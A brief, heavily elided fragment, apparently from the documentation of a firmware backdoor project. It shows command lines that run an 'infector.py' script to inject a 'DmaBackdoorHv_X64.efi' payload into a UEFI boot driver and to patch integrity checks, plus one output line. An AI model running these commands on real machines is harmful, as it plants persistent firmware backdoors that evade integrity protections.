...
```
> python infector.py --payload DmaBackdoorHv_X64.efi --infect Bds.efi --output Bds_infected.efi
```
...
```
C:\> python .\infector.py --patch-integrity-checks --payload .\DmaBackdoorHv_X64.efi ^ 
...
[+] Infector payload: .\DmaBackdoorHv_X64.efi
